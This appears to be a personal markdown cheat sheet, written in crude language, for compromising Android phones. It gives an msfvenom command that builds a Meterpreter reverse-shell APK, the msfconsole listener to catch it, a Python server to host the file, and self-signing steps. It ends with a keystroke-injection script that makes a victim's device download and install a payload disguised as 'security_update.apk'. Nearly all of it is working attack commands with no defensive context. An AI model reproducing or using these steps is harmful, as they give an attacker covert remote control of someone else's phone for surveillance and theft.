# Android Hackfuckin
## Meterpreter
`msfvenom --payload android/meterpreter_reverse_tcp LHOST=10.0.0.51 LPORT=443 R > rawdoggin_output.apk`

## Msfconsole
```
sudo msfconsole -q
msf > use exploit/multi/handler
msf exploit(handler) > set payload android/meterpreter_reverse_tcp
msf exploit(handler) > set lhost 10.0.0.51
msf exploit(handler) > set lport 443
msf exploit(handler) > exploit -j
```

## Python Shitfuckery
`python -m http.server 8787`

## Self Sign an apk
### Install tools
1. `sudo apt update`
2. `sudo apt install apktool gnupg2 android-tools-adb default-jdk -y`
### Create Signing Key
* `keytool -genkey -v -keystore android.keystore -alias android -keyalg RSA -keysize 2048 -validity 10000`
### Sign Apk
* `jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore android.keystore my_app.apk android`


## Some Shit
```
TAB
DELAY 250
GUI b
DELAY 800
CTRL SHIFT n
DELAY 500
CTRL l
DELAY 1000
STRING 192.168.4.4:9002/security_update.apk
ENTER
DELAY 7000
TAB
TAB
DOWN
RIGHT
ENTER
DELAY 1000
TAB
ENTER
TAB
TAB
RIGHT
ENTER
TAB
ENTER
TAB
ENTER
DELAY 2000
TAB
ENTER
TAB
TAB
TAB
TAB
TAB
TAB
TAB
TAB
DELAY 350
TAB
ENTER
DELAY 350
ENTER
```